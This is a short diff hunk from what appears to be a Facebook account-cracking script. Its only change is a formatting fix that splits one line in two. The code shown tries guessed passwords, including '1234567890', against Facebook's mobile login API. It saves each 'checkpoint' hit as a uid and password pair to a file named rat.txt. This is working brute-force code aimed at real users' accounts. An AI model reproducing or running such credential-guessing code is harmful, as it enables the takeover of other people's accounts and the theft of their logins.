@@ -536,7 +536,8 @@ def crack_select1():
 																																	print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass15+"\033[0;97m")
 																																	cp = open("rat.txt", "a")
 																																	cp.write(uid+"|"+pass15+"\n")
-																																	cp.close()											cps.append(uid+pass15)
+																																	cp.close()											
+																																	cps.append(uid+pass15)
 																																else:
 																																	pass16 = "1234567890"
 																																	api = 'https://b-api.facebook.com/method/auth.login'
